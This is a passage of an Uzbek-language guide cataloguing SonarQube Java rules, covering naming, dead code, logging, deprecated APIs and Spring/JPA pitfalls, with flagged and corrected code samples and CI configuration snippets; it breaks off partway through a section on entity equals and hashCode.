Tavsiya: nomlash qoidalarini birinchi kunda yoqing, chunki keyin minglab qatorni qayta nomlash review ni bo'g'ib qo'yadi.

### 28.2 Bitta harfli va ma'nosiz nomlar

Bu yerda halol bo'lish kerak. Standart `java:S117` regex `^[a-z][a-zA-Z0-9]*$` ko'rinishida bo'lgani uchun `s`, `l`, `x` kabi nomlar odatda shikoyatga tushmaydi. Ya'ni pastdagi kod default profilda nomlash bo'yicha toza ko'rinadi, lekin o'qishga og'ir.

```java
// Default profilda Sonar jim turadi, lekin bu kod o'qilmaydi
public BigDecimal calc(List<OrderLine> l) {
    BigDecimal s = BigDecimal.ZERO;
    for (OrderLine x : l) {
        BigDecimal p = x.getPrice()
                .multiply(BigDecimal.valueOf(x.getQuantity()));
        s = s.add(p);
    }
    return s;
}
```

Buni Sonar bilan ushlash uchun qoidaning `format` parametrini quality profile da qattiqlashtirish kerak. Masalan kamida ikki belgi talab qilish. Profile backup XML da bu shunday ko'rinadi.

```xml
<!-- Quality profile backup: mahalliy o'zgaruvchi nomi kamida 2 belgi -->
<profile>
  <name>Team Java</name>
  <language>java</language>
  <rules>
    <rule>
      <repositoryKey>java</repositoryKey>
      <key>S117</key>
      <priority>MINOR</priority>
      <parameters>
        <parameter>
          <key>format</key>
          <value>^[a-z][a-zA-Z0-9]+$</value>
        </parameter>
      </parameters>
    </rule>
  </rules>
</profile>
```

Tuzatilgan variant nomlarni domen tilida ataydi va metod nomini ham aniqlashtiradi.

```java
public BigDecimal calculateOrderTotal(List<OrderLine> orderLines) {
    BigDecimal total = BigDecimal.ZERO;
    for (OrderLine line : orderLines) {
        BigDecimal lineAmount = line.getPrice()
                .multiply(BigDecimal.valueOf(line.getQuantity()));
        total = total.add(lineAmount);
    }
    return total;
}
```

Tavsiya: sikl indeksi uchun `i` ni qoldiring, qolgan hamma joyda nomni domen atamasi bilan ataydigan regex ni profilga yozib qo'ying.

### 28.3 Ishlatilmaydigan import, maydon, parametr va mahalliy o'zgaruvchi

To'rtta alohida qoida bir xil muammoni ko'rsatadi: kod o'quvchiga yolg'on ma'lumot beradi. `java:S1128` keraksiz import, `java:S1068` foydalanilmagan private maydon, `java:S1172` foydalanilmagan parametr, `java:S1481` qiymati o'qilmagan mahalliy o'zgaruvchi.

```java
import java.util.Optional;          // java:S1128: ishlatilmaydi
import java.time.Duration;          // java:S1128: ishlatilmaydi

@Service
public class StockService {

    private final StockRepository stockRepository;
    private int lastCheckedCount;                  // java:S1068

    public void reserve(long productId, int qty, String reasonCode) {
        int available = stockRepository.available(productId);  // java:S1481
        stockRepository.decrease(productId, qty);              // reasonCode: java:S1172
    }
}
```

`java:S1481` ayniqsa qimmatli signal. Ko'pincha o'zgaruvchi o'qilmagani demak, muallif tekshiruvni yozishni unutgan. Shuning uchun bu shikoyatni avtomatik o'chirib tashlamang, avval mantiqni qayta o'qing.

```java
@Service
public class StockService {

    private final StockRepository stockRepository;

    public void reserve(long productId, int quantity) {
        int available = stockRepository.available(productId);
        if (available < quantity) {                 // o'zgaruvchi endi ishlatiladi
            throw new InsufficientStockException(productId, quantity, available);
        }
        stockRepository.decrease(productId, quantity);
    }
}
```

Tavsiya: `java:S1481` chiqsa birinchi savol "o'chiramanmi" emas, "qanday tekshiruv yozilmay qolgan" bo'lsin.

### 28.4 Ishlatilmaydigan private metod va o'lik kod

`java:S1144` hech qayerdan chaqirilmaydigan `private` metodni belgilaydi. Bu Sonar eng ishonchli topadigan o'lik kod turi, chunki `private` ko'rinish doirasi fayl bilan chegaralangan.

```java
@Service
public class ReportService {

    public Report monthly(YearMonth month) {
        return build(month);
    }

    private Report build(YearMonth month) { /* ... */ }

    private Report buildLegacy(YearMonth month) {   // java:S1144: chaqirilmaydi
        return new Report(month, List.of());
    }

    private String formatHeader(Report r) {         // java:S1144: chaqirilmaydi
        return "Report " + r.getMonth();
    }
}
```

Repository da bunga o'xshash holat ko'proq uchraydi: hech kim chaqirmaydigan `@Query`. Sonar uni `private` bo'lmagani uchun o'lik kod deb atamaydi, lekin u ham qo'llab-quvvatlash yuki.

```sql
-- Hech kim chaqirmaydigan native query: Sonar ko'rmaydi, lekin baribir o'lik kod
SELECT o.id, o.total
  FROM orders o
 WHERE o.status = 'LEGACY_HOLD'
   AND o.created_at < now() - interval '2 years';
```

Tuzatish oddiy: metodni o'chirib, git tarixiga tayanish. Tarix allaqachon zaxira nusxa, shuning uchun kodni "ehtimol kerak bo'ladi" deb saqlash asossiz.

```java
@Service
public class ReportService {

    public Report monthly(YearMonth month) {
        return build(month);
    }

    private Report build(YearMonth month) { /* ... */ }
}
```

Tavsiya: o'lik kodni o'chirishni alohida commit qiling, shunda review diff da mantiq o'zgarishi bilan aralashmaydi.

### 28.5 Kommentariyaga olingan kod bloki

`java:S125` kommentariya ichidagi kodni aniqlaydi. Parser kommentni tahlil qiladi va u Java sintaksisiga o'xshasa shikoyat yozadi. Bu qoida major darajada bo'ladi, chunki o'quvchi qaysi variant haqiqiy ekanini bilmaydi.

```java
public void refund(long paymentId, BigDecimal amount) {
    // java:S125: quyidagi blok kommentga olingan kod
    // if (amount.compareTo(payment.getTotal()) > 0) {
    //     throw new IllegalArgumentException("Refund exceeds total");
    // }
    gateway.refund(paymentId, amount);
}
```

Ikkita yo'l bor. Agar tekshiruv kerak bo'lsa, uni tiriltiring va testini yozing. Kerak bo'lmasa, o'chiring va nega olib tashlanganini bitta jumla bilan izohlang.

```java
public void refund(long paymentId, BigDecimal amount) {
    Payment payment = paymentRepository.getById(paymentId);
    if (amount.compareTo(payment.getTotal()) > 0) {
        throw new RefundExceedsTotalException(paymentId);
    }
    gateway.refund(paymentId, amount);
}
```

Tavsiya: kommentda kod saqlashni taqiqlang, chunki versiya nazorati buni sizdan yaxshiroq bajaradi.

### 28.6 `TODO` va `FIXME` izohlari va ularning hisobi

`java:S1135` `TODO` ni, `java:S1134` esa `FIXME` ni belgilaydi. Ikkisining farqi muhim: `TODO` odatda info darajasida va quality gate ga kirmaydi, `FIXME` esa major bo'ladi va `Maintainability Rating` ga ta'sir qiladi.

```java
@Service
public class InvoiceService {

    public Invoice issue(long orderId) {
        // TODO: valyuta kursini kesh orqali olish      java:S1135, info
        // FIXME: yakkalangan tranzaksiyada ikki marta yozilmoqda   java:S1134, major
        return invoiceRepository.save(buildInvoice(orderId));
    }
}
```

Hisobni ko'rish uchun Sonar ni kutish shart emas. Lokal `grep` bilan tendensiyani kuzatish mumkin, bu CI da ham arzon.

```bash
# TODO va FIXME hisobini chiqarish, faqat asosiy manba daraxti
grep -rn --include='*.java' -E '//\s*(TODO|FIXME)' src/main/java | wc -l
grep -rn --include='*.java' -E '//\s*FIXME' src/main/java

# FIXME soni noldan katta bo'lsa buildni to'xtatish
if grep -rq --include='*.java' -E '//\s*FIXME' src/main/java; then
  echo "FIXME qolgan, release bloklanadi" >&2
  exit 1
fi
```

Tavsiya: `TODO` ni issue tracker raqami bilan yozishni majburiy qiling va `FIXME` ni release bloklovchi belgi deb kelishib oling.

### 28.7 Eskirgan (deprecated) API ishlatish

Sonar bu mavzuda ikki tomondan yuradi. `java:S1874` eskirgan elementni chaqirgan kodni, `java:S1133` esa o'zingiz `@Deprecated` deb belgilagan va hali o'chirmagan kodni ko'rsatadi.

```java
@Service
public class OrderService {

    @Deprecated                                  // java:S1133: o'chirish rejasi yo'q
    public void placeOrder(OrderDto dto) {
        placeOrder(dto, Channel.WEB);
    }

    public BigDecimal fee(double amount) {
        BigDecimal value = new BigDecimal(amount);   // aniqlik yo'qoladi
        return value.multiply(new BigDecimal("0.02"));
    }
}
```

Spring Boot 3.x ga ko'chishda `java:S1874` oqimi odatda keskin oshadi, chunki 2.x API lari eskiradi. Tuzatishda `@Deprecated` ga `since` va `forRemoval` qo'shish Sonar ga ham, jamoaga ham aniq signal beradi.

```java
@Deprecated(since = "3.4.0", forRemoval = true)
public void placeOrder(OrderDto dto) {
    placeOrder(dto, Channel.WEB);
}

public BigDecimal fee(BigDecimal amount) {
    return amount.multiply(new BigDecimal("0.02"));   // double ishlatilmaydi
}
```

Tavsiya: har bir `@Deprecated` ga `forRemoval` va o'chirish versiyasini yozing, aks holda eskirgan kod abadiy yashaydi.

### 28.8 `public` maydon va kapsullashning buzilishi

`java:S1104` har qanday `public` nostatik maydonni belgilaydi. `java:S2386` esa alohida va og'irroq holat: `public static` o'zgaruvchan kolleksiya yoki massiv. Ikkinchisi ba'zi profilda security tomonga ham tortiladi, chunki tashqi kod global holatni almashtirib yuborishi mumkin.

```java
@Service
public class PricingService {

    public BigDecimal lastMargin;                      // java:S1104

    public static final Map<String, BigDecimal> RATES  // java:S2386
            = new HashMap<>();                         // final, lekin mazmuni o'zgaradi
}
```

`final` so'zi bu yerda yetarli emas. `final` havolani qotiradi, kolleksiya ichini emas. Shuning uchun `Map.copyOf` yoki `Collections.unmodifiableMap` kerak.

```java
@Service
public class PricingService {

    private BigDecimal lastMargin;                     // kapsullangan

    private static final Map<String, BigDecimal> RATES =
            Map.of("UZS", new BigDecimal("1.00"));     // o'zgarmas

    public BigDecimal getLastMargin() {
        return lastMargin;
    }
}
```

Tavsiya: `public` maydonni faqat `record` ichida yoki `static final` immutable qiymat uchun qoldiring, boshqa hamma joyda `private` qiling.

### 28.9 `final` qo'yilmagan o'zgarmas maydon

Sonar da bu holat bir nechta qoida orqali ko'rinadi, shuning uchun aniq kalitni faqat profilda ko'rganingizda yozing. Eng ishonchlisi `java:S1170`: deklaratsiyada qiymat beriladigan `public` maydon `static final` bo'lishi kerak. Konstruktor orqali injeksiya qilingan Spring bog'liqliklari esa `final` bo'lmasa, Sonar odatda minor code smell beradi va ba'zi profilda bu qoida o'chirilgan bo'ladi.

```java
@Service
public class ShipmentService {

    public int maxParcelWeight = 30;        // java:S1170: static final bo'lishi kerak

    private ShipmentRepository repository;  // konstruktorda beriladi, lekin final emas

    public ShipmentService(ShipmentRepository repository) {
        this.repository = repository;
    }
}
```

`final` ning foydasi stilistik emas. U maydon faqat konstruktorda tayinlanganini kompilyator darajasida kafolatlaydi va klassni ko'p oqimli muhitda xavfsiz qiladi.

```java
@Service
public class ShipmentService {

    private static final int MAX_PARCEL_WEIGHT_KG = 30;

    private final ShipmentRepository repository;

    public ShipmentService(ShipmentRepository repository) {
        this.repository = repository;
    }
}
```

Tavsiya: barcha konstruktor injeksiyasi maydonlarini `final` qiling, bu bir vaqtning o'zida Sonar shikoyatini ham, kelajakdagi `@Autowired` setter vasvasasini ham yopadi.

### 28.10 Ortiqcha modifikator (interfeysda `public abstract`)

`java:S2333` kontekstdan kelib chiqib ortiqcha bo'lgan modifikatorni belgilaydi. Interfeys metodi allaqachon `public abstract`, interfeys maydoni allaqachon `public static final`, `final` klass metodiga `final` qo'yish ham ortiqcha.

```java
public interface PaymentGateway {

    public static final int TIMEOUT_MS = 5_000;   // java:S2333: uchta ortiqcha so'z

    public abstract Receipt charge(ChargeRequest request);   // java:S2333

    abstract void refund(long paymentId);                    // java:S2333
}
```

Tuzatish faqat olib tashlash. Mazmun o'zgarmaydi, shuning uchun bu o'zgarish uchun test yozish shart emas.

```java
public interface PaymentGateway {

    int TIMEOUT_MS = 5_000;

    Receipt charge(ChargeRequest request);

    void refund(long paymentId);
}
```

Tavsiya: bu qoidani IDE ning save action yoki `spotless` formatlovchisi bilan avtomatlashtiring, qo'lda tuzatish vaqt yo'qotish.

### 28.11 Satr birlashtirishni sikl ichida bajarish

`java:S1643` siklda `+` bilan satr yig'ishni belgilaydi. Sababi aniq: har iteratsiyada yangi `String` obyekti yaratiladi, natijada murakkablik elementlar soniga kvadratik bog'lanadi. Hisobot generatsiyasida bu eng tez sezilaradigan muammo.

```java
public String buildCsv(List<OrderRow> rows) {
    String csv = "";
    for (OrderRow row : rows) {
        csv += row.getId() + ";" + row.getTotal() + "\n";   // java:S1643
    }
    return csv;
}
```

Zamonaviy JVM bitta ifoda ichidagi birlashtirishni optimallashtiradi, lekin sikl iteratsiyalari orasida buni qila olmaydi. Shuning uchun `StringBuilder` yoki `Collectors.joining` kerak.

```java
public String buildCsv(List<OrderRow> rows) {
    return rows.stream()
            .map(row -> row.getId() + ";" + row.getTotal())
            .collect(Collectors.joining("\n", "", "\n"));
}
```

Tavsiya: siklda satr yig'ish ko'rsangiz darhol `StringBuilder` yoki `joining` ga o'tkazing, bu tuzatish deyarli hech qachon xatarli emas.

### 28.12 Loglashda satr birlashtirish va formatlangan xabarga o'tish

`java:S2629` log chaqiruvining argumenti chaqiruvdan oldin hisoblanishini belgilaydi. Ya'ni `log.debug("id=" + id)` da satr birlashtirish `debug` darajasi o'chirilgan bo'lsa ham bajariladi. Issiq kod yo'lida bu real CPU sarfi.

```java
public void process(Order order) {
    // java:S2629: argument har safar qurib chiqiladi
    log.debug("Buyurtma qayta ishlanmoqda: " + order.toLongDescription());
    log.info("Buyurtma " + order.getId() + " holati " + order.getStatus());
}
```

SLF4J ning `{}` shabloni muammoni yopadi, chunki formatlash faqat daraja yoqilgan bo'lsa bajariladi. Qimmat argument uchun `Supplier` variantini yoki `isDebugEnabled` tekshiruvini ishlatish mumkin.

```java
public void process(Order order) {
    if (log.isDebugEnabled()) {                     // qimmat argument uchun
        log.debug("Buyurtma qayta ishlanmoqda: {}", order.toLongDescription());
    }
    log.info("Buyurtma {} holati {}", order.getId(), order.getStatus());
}
```

Tavsiya: loglarda `+` ni butunlay taqiqlang va `{}` shablonini jamoa standarti qilib yozib qo'ying.

### 28.13 Ortiqcha `toString` va `String.valueOf` chaqiruvi

Ikki alohida qoida bir xil odatdan kelib chiqadi. `java:S1858` allaqachon `String` bo'lgan qiymatda `toString()` chaqirilganini belgilaydi. `java:S1153` esa satr birlashtirish ichida `String.valueOf` ishlatilganini ko'rsatadi, chunki `+` operatori konvertatsiyani o'zi bajaradi.

```java
public String describe(Order order) {
    String code = order.getCode();
    String a = "Kod: " + code.toString();                 // java:S1858
    String b = "Jami: " + String.valueOf(order.getTotal()); // java:S1153
    return a + " " + b;
}
```

Bu shikoyatlar minor, lekin ular ko'pincha chuqurroq muammoning izi. `code.toString()` yozgan odam `code` ning turini bilmagan, ya'ni kod o'qilmaydi.

```java
public String describe(Order order) {
    return "Kod: " + order.getCode()
            + " Jami: " + order.getTotal();   // konvertatsiya avtomatik
}
```

Tavsiya: bu ikki qoidani avtomatik tuzatish ro'yxatiga qo'ying, lekin tuzatish paytida o'zgaruvchi turi aniq ko'rinishiga ham e'tibor bering.

### 28.14 Bir xil ishni bajaradigan ikkita metod

`java:S4144` tanasi identik bo'lgan ikki metodni belgilaydi. Bu Sonar ning duplication o'lchovidan boshqa narsa: `Duplications` metrikasi blok darajasida ishlaydi, `java:S4144` esa metod darajasida ishlaydi va kichik metodlarda ham chiqadi.

```java
@Service
public class WarehouseService {

    public int availableQty(long productId) {
        return stockRepository.sumOnHand(productId)
                - stockRepository.sumReserved(productId);
    }

    public int freeQty(long productId) {              // java:S4144: identik tana
        return stockRepository.sumOnHand(productId)
                - stockRepository.sumReserved(productId);
    }
}
```

Repository da bu holat yana osonroq paydo bo'ladi: ikki derived query bir xil SQL ga aylanadi. Tuzatish bitta nom qoldirib, ikkinchisini delegatsiya qilish yoki butunlay o'chirish.

```java
@Service
public class WarehouseService {

    public int availableQty(long productId) {
        return stockRepository.sumOnHand(productId)
                - stockRepository.sumReserved(productId);
    }

    @Deprecated(since = "2.7.0", forRemoval = true)
    public int freeQty(long productId) {
        return availableQty(productId);     // yagona manba
    }
}
```

Tavsiya: identik metodlardan birini darhol o'chiring, o'chirish mumkin bo'lmasa delegatsiya qilib `forRemoval` belgisini qo'ying.

### 28.15 Oddiy yondashuv va arxitektor yondashuvi

| Savol | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Minor code smell lar bilan nima qilish | "Keyin tuzatamiz" deb butun loyihaga qoldiradi | New Code gate ni nolga qo'yadi, eski qarzni alohida reja bilan yopadi |
| Nomlash qoidalari | Default profilni o'zgarishsiz qoldiradi | `format` parametrini jamoa konvensiyasiga moslab yozadi |
| Ishlatilmagan o'zgaruvchi | Darhol o'chirib tashlaydi | Avval "qanday tekshiruv yozilmagan" deb so'raydi, keyin qaror qiladi |
| `TODO` va `FIXME` | Ikkisini bir xil ko'radi | `TODO` ni issue raqamiga bog'laydi, `FIXME` ni release blokeri qiladi |
| Deprecated API | Ogohlantirishni e'tiborsiz qoldiradi | `forRemoval` va migratsiya muddatini kodga yozadi |
| O'lik kod | "Ehtimol kerak bo'ladi" deb saqlaydi | Git tarixiga tayanib o'chiradi, alohida commit qiladi |
| Loglash | `+` bilan yozadi, chunki ishlaydi | `{}` shablonini standart qilib, qimmat argumentni shartga oladi |
| Uslub shikoyatlari | Qo'lda, review da tuzatadi | Formatlovchi va save action bilan avtomatlashtiradi |
| Issue larni yopish | `// NOSONAR` qo'yadi | Qoidani profilda ongli ravishda o'chiradi va sababini yozadi |
| Metrika maqsadi | "Hamma issue nol bo'lsin" | Rating va New Code shartlarini ajratib, realistik maqsad qo'yadi |

### 28.16 Tuzoqlar va yechimlar

| Tuzoq | Nega yuzaga keladi | Yechim |
|---|---|---|
| Butun loyihaga ommaviy "auto-fix" PR | Minglab qator o'zgaradi, review imkonsiz | Faqat o'zgargan fayllarda tuzating, New Code gate ga tayaning |
| `// NOSONAR` ning tarqalishi | Eng tez yo'l shu ko'rinadi | Qoida haqiqatan keraksiz bo'lsa profilda o'chiring, izoh bilan |
| `@SuppressWarnings` ning keng doirasi | Klass ustiga qo'yiladi | Faqat metod yoki o'zgaruvchi darajasida, aniq kalit bilan |
| Generatsiya qilingan kod shikoyat beradi | Analiz doirasiga kirib qolgan | `sonar.exclusions` bilan generatsiya papkasini chiqarib tashlang |
| Lombok dan keyin "ishlatilmagan maydon" | Analizda annotation processing ishlamagan | `sonar.java.binaries` ni kompilyatsiya natijasiga qarating |
| Test kodida nomlash shikoyatlari | Bitta profil ikki manba uchun ishlatilgan | Test fayllariga alohida profil yoki `sonar.test.exclusions` |
| `FIXME` ni o'chirib, muammoni qoldirish | Gate o'tsin deb qilinadi | Issue tracker ga ko'chirib, havolani kodga yozing |
| Rating yaxshilanmaydi | Faqat minor smell lar tuzatilgan | Remediation effort katta bo'lgan major issue larni avval oling |

Analizni to'g'ri sozlash ham shu katalogning bir qismi. Pastdagi sozlash generatsiya qilingan kodni va migratsiya skriptlarini analizdan chiqaradi, shuning uchun soxta shikoyatlar kamayadi.

```properties
# sonar-project.properties: shovqinni kamaytirish
sonar.sources=src/main/java
sonar.tests=src/test/java
sonar.java.binaries=target/classes
sonar.exclusions=**/generated/**,**/*MapperImpl.java,**/db/migration/**
sonar.test.exclusions=**/*IT.java
sonar.issue.ignore.multicriteria=e1
sonar.issue.ignore.multicriteria.e1.ruleKey=java:S1135
sonar.issue.ignore.multicriteria.e1.resourceKey=**/legacy/**
```

CI da esa yangi kod uchun qattiq, eski kod uchun yumshoq siyosat yuritish mumkin. Quality gate shartlari har loyihada boshqacha sozlanadi, shuning uchun bu yerda universal retsept yo'q. Quyidagi pipeline faqat analizni yuboradi va gate natijasini kutadi.

```yaml
# .github/workflows/sonar.yml dan qism
- name: Build va analiz
  run: >
    ./mvnw -B verify sonar:sonar
    -Dsonar.projectKey=shop-backend
    -Dsonar.qualitygate.wait=true
  env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

- name: FIXME tekshiruvi
  run: |
    ! grep -rq --include='*.java' -E '//\s*FIXME' src/main/java
```

### 28.17 Amalda qo'llash

- [ ] Quality profile da `java:S100`, `java:S101`, `java:S115`, `java:S116`, `java:S117` yoqilganini tekshiring va `format` parametrini jamoa konvensiyasiga moslang.
- [ ] `java:S1068`, `java:S1128`, `java:S1172`, `java:S1481`, `java:S1144` bo'yicha hozirgi issue sonini yozib oling, bu sizning boshlang'ich nuqtangiz.
- [ ] Har bir `java:S1481` shikoyatini qo'lda ko'rib chiqing va yozilmay qolgan tekshiruv bor-yo'qligini aniqlang.
- [ ] Barcha konstruktor injeksiyasi maydonlarini `final` qilib, `public` nostatik maydonlarni `private` ga o'tkazing.
- [ ] Loglardagi `+` birlashtirishlarni `{}` shabloniga ko'chiring va qimmat argumentlarni `isDebugEnabled` ichiga oling.
- [ ] `FIXME` sonini CI da nolga majburlang va mavjud `FIXME` larni issue tracker ga ko'chirib, havolasini `TODO` ga yozing.
- [ ] `sonar.exclusions` va `sonar.java.binaries` ni to'g'rilab, generatsiya qilingan kod shikoyatlarini yo'q qiling.
- [ ] Formatlovchi va IDE save action ni sozlab, `java:S2333`, `java:S1858`, `java:S1153` kabi uslub shikoyatlari qayta paydo bo'lmasligiga erishing.

## 29. Xato katalogi: Spring, JPA va PostgreSQL ga xos xatolar (Catalog: Spring, JPA and PostgreSQL)

Spring va JPA loyihalarida Sonar shikoyatlarining katta qismi bir necha o'nlab takrorlanuvchi holatdan kelib chiqadi. Bu bob shu holatlarni katalog sifatida yig'adi: avval qisqa xulosa jadvali, keyin har bir holat uchun shikoyat qilinadigan kod va tuzatilgan variant. Bu yerda faqat bitta savolga javob bor: Sonar nima deydi va kodni qanday o'zgartirsak shikoyat yo'qoladi.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
|---|---|---|---|---|
| Maydonga `@Autowired` | Field injection ishlatilmasin, konstruktor orqali kirit (`java:S6813`) | maintainability (code smell) | Major | Bean ni test da yaratish qiyin, majburiy bog'liqlik ko'rinmaydi |
| Singleton bean da o'zgaruvchan maydon | Umumiy holat sinxronlanmagan, poyga xavfi bor | reliability (bug) | Critical | Yuklama ostida natija noto'g'ri, xato takrorlanmaydi |
| `private` metodda `@Transactional` | Annotatsiya kuchga kirmaydi, proxy uni ko'rmaydi | reliability (bug) | Major | Tranzaksiya ochilmaydi, rollback ishlamaydi |
| Controller da biznes mantiq | Metod juda murakkab, cognitive complexity chegaradan oshdi (`java:S3776`) | maintainability (code smell) | Critical | Test yozish qiyin, coverage past qoladi |
| Entity ni API javobida qaytarish | Ichki modelni tashqariga ochish, lazy maydon va ortiqcha ma'lumot | security hotspot va code smell | Major | Ma'lumot oshkor bo'ladi, sxema o'zgarsa API sinadi |
| Entity da `equals` faqat `id` bo'yicha emas | `equals` va `hashCode` kelishmaydi, shartnoma buzildi | reliability (bug) | Critical | `Set` ichida dublikat, collection da element topilmaydi |
| `@OneToMany(fetch = EAGER)` | Eager yuklash keraksiz so'rovlarni keltiradi | maintainability (code smell) | Major | N+1 so'rov, javob vaqti o'sadi |
| `findAll()` ni cheklovsiz chaqirish | Natija hajmi cheklanmagan, sahifalash yo'q | reliability (bug) | Major | Katta jadvalda xotira tugaydi |
| Native query da satr birlashtirish | SQL ni dinamik qurish, injection xavfi (`java:S2077`) | security (vulnerability) | Blocker | Tashqi kiritish bilan baza o'qiladi yoki o'zgartiriladi |
| `@Value` da maxfiy standart qiymat | Kodda qattiq yozilgan parol yoki kalit (`java:S2068`) | security (vulnerability) | Blocker | Kalit git tarixida qoladi, rotatsiya qilinmaydi |
| `application.yml` da ochiq parol | Konfiguratsiyada credential saqlanmoqda (`java:S2068`) | security (vulnerability) | Blocker | Artifact ichida parol tarqaladi |
| 40 ta bean li `@Configuration` | Klass juda katta, javobgarlik aralashgan | maintainability (code smell) | Major | O'zgarish narxi oshadi, kontekst sekin ko'tariladi |
| `catch (Exception e)` va stack trace javobda | Umumiy istisno ushlanmoqda (`java:S2221`), ichki ma'lumot oshkor | security hotspot va code smell | Critical | Ichki tuzilma tashqariga chiqadi, xato yashiriladi |
| `RestTemplate` timeout siz | Tashqi chaqiruv cheksiz kutishi mumkin | reliability (bug) | Major | Thread pool to'ladi, servis javob bermaydi |

### 29.1 Maydonga `@Autowired` qo'yish

Shikoyat qilinadigan kod:

```java
@Service
public class ToLovServisi {
    // Sonar shikoyati: field injection
    @Autowired
    private HisobRepository hisobRepository;
    @Autowired
    private KursProvayderi kursProvayderi;
}
```

Sonar buni `java:S6813` bo'yicha belgilaydi. Maydonga kiritilgan bog'liqlikni `final` qilib bo'lmaydi, shuning uchun bean yaratilgandan keyin ham almashtirilishi mumkin.

Tuzatilgan kod:

```java
@Service
public class ToLovServisi {
    private final HisobRepository hisobRepository;
    private final KursProvayderi kursProvayderi;

    // Bitta konstruktor bo'lsa @Autowired shart emas
    public ToLovServisi(HisobRepository hisobRepository,
                        KursProvayderi kursProvayderi) {
        this.hisobRepository = hisobRepository;
        this.kursProvayderi = kursProvayderi;
    }
}
```

Tavsiya: barcha majburiy bog'liqlikni `final` maydon va bitta konstruktor orqali kirit.

### 29.2 Singleton bean ichida o'zgaruvchan holat saqlash

Shikoyat qilinadigan kod:

```java
@Service
public class HisobotServisi {
    // Sonar shikoyati: singleton da umumiy o'zgaruvchan holat
    private BigDecimal joriyJami = BigDecimal.ZERO;

    public BigDecimal hisobla(List<Buyurtma> buyurtmalar) {
        joriyJami = BigDecimal.ZERO;
        buyurtmalar.forEach(b -> joriyJami = joriyJami.add(b.summa()));
        return joriyJami;
    }
}
```

Sonar bu holatni ikki tomondan ko'radi: bean maydoni sinxronlanmagan holda o'zgartiriladi va metod natijasi umumiy maydonga bog'liq. Spring bean i standart holda singleton, shuning uchun bir vaqtda kelgan ikki so'rov bir xil maydonni yozadi.

Tuzatilgan kod:

```java
@Service
public class HisobotServisi {
    public BigDecimal hisobla(List<Buyurtma> buyurtmalar) {
        // Holat metod ichida, har bir chaqiruv mustaqil
        return buyurtmalar.stream()
                .map(Buyurtma::summa)
                .reduce(BigDecimal.ZERO, BigDecimal::add);
    }
}
```

Tavsiya: bean maydoni faqat `final` bog'liqlik uchun, hisob holati esa metod lokal o'zgaruvchisida yashasin.

### 29.3 `@Transactional` ni `private` yoki ichki chaqiriladigan metodga qo'yish

Shikoyat qilinadigan kod:

```java
@Service
public class BuyurtmaServisi {
    public void qabulQil(Buyurtma b) {
        // Shikoyat: o'z klassidan chaqirilgan @Transactional ishlamaydi
        saqla(b);
    }

    @Transactional
    private void saqla(Buyurtma b) {
        buyurtmaRepository.save(b);
        qoldiqRepository.kamaytir(b.mahsulotId(), b.soni());
    }
}
```

Sonar `@Transactional` ni `private` metodda yoki o'z klassi ichidan chaqirilgan metodda ko'rsa shikoyat qiladi. Sabab proxy orqali chaqiruv bo'lmasligi, demak annotatsiya umuman bajarilmaydi.

Tuzatilgan kod:

```java
@Service
public class BuyurtmaServisi {
    // Annotatsiya tashqaridan chaqiriladigan public metodda
    @Transactional
    public void qabulQil(Buyurtma b) {
        buyurtmaRepository.save(b);
        qoldiqRepository.kamaytir(b.mahsulotId(), b.soni());
    }
}
```

Tavsiya: `@Transactional` ni faqat tashqaridan chaqiriladigan `public` metodga qo'y, ichki chaqiruvga tayanma.

### 29.4 Controller da biznes mantiq va uni servisga ko'chirish

Shikoyat qilinadigan kod:

```java
@PostMapping("/buyurtma")
public ResponseEntity<?> yarat(@RequestBody BuyurtmaSorovi s) {
    if (s.soni() <= 0) return ResponseEntity.badRequest().build();
    var mahsulot = mahsulotRepository.findById(s.mahsulotId()).orElse(null);
    if (mahsulot == null) return ResponseEntity.notFound().build();
    if (mahsulot.getQoldiq() < s.soni()) return ResponseEntity.status(409).build();
    var chegirma = s.soni() > 10 ? new BigDecimal("0.1") : BigDecimal.ZERO;
    // ... yana o'nlab shart va hisob
    return ResponseEntity.ok(buyurtmaRepository.save(new Buyurtma()));
}
```

Sonar bu metodda `java:S3776` cognitive complexity chegarasidan oshganini aytadi va ko'pincha metod uzunligi haqida ham ogohlantiradi. Bunday metodni test bilan yopish uchun o'nlab mock kerak, shuning uchun coverage past qoladi.

Tuzatilgan kod:

```java
@PostMapping("/buyurtma")
public ResponseEntity<BuyurtmaJavobi> yarat(@Valid @RequestBody BuyurtmaSorovi s) {
    // Controller faqat uzatadi, qaror servisda
    return ResponseEntity.ok(buyurtmaServisi.yarat(s));
}
```

Tavsiya: controller da faqat validatsiya annotatsiyasi va chaqiruv qolsin, qarorni servisga ko'chir va shu servisni oddiy unit test bilan yop.

### 29.5 Entity ni to'g'ridan-to'g'ri API javobida qaytarish

Shikoyat qilinadigan kod:

```java
@GetMapping("/hisob/{id}")
public Hisob hisob(@PathVariable Long id) {
    // Shikoyat: ichki model tashqariga chiqdi
    return hisobRepository.findById(id).orElseThrow();
}
```

Sonar bu holatda bir nechta shikoyat beradi: ichki domen obyektini tashqi chegaraga chiqarish code smell, parol hash i yoki ichki izoh kabi maydonlar bo'lsa security hotspot. JPA entity sida lazy bog'lanish bo'lsa serializatsiya paytida qo'shimcha so'rov yoki istisno chiqadi.

Tuzatilgan kod:

```java
public record HisobJavobi(Long id, String raqam, BigDecimal qoldiq) {
    // Faqat tashqariga kerak maydonlar
    static HisobJavobi dan(Hisob h) {
        return new HisobJavobi(h.getId(), h.getRaqam(), h.getQoldiq());
    }
}

@GetMapping("/hisob/{id}")
public HisobJavobi hisob(@PathVariable Long id) {
    return HisobJavobi.dan(hisobServisi.topish(id));
}
```

Tavsiya: har bir endpoint uchun alohida `record` javob tipi tuz va entity ni web qatlamidan chiqarma.

### 29.6 Entity da `equals` va `hashCode` ni noto'g'ri yozish

Shikoyat qilinadigan kod:

```java
@Entity
public class Mahsulot {
    @Id @GeneratedValue
    private Long id;
    private String nomi;

    // Shikoyat: faqat equals bor, hashCode yo'q
    @Override
    public boolean equals(Object o) {
        return o instanceof Mahsulot m && Objects.equals(nomi, m.nomi);
    }
}
```

Sonar `equals` va `hashCode` ni juft holda talab qiladi va faqat bittasi yozilgan bo'lsa reliability xatosi beradi. Ikkinchi muammo esa o'zgaradigan maydon bo'yicha taqqoslash: entity `HashSet` ga qo'shilgandan keyin `nomi` o'zgarsa, element topilmay qoladi.

Tuzatilgan kod:

```java
@Entity
public class Mahsulot {
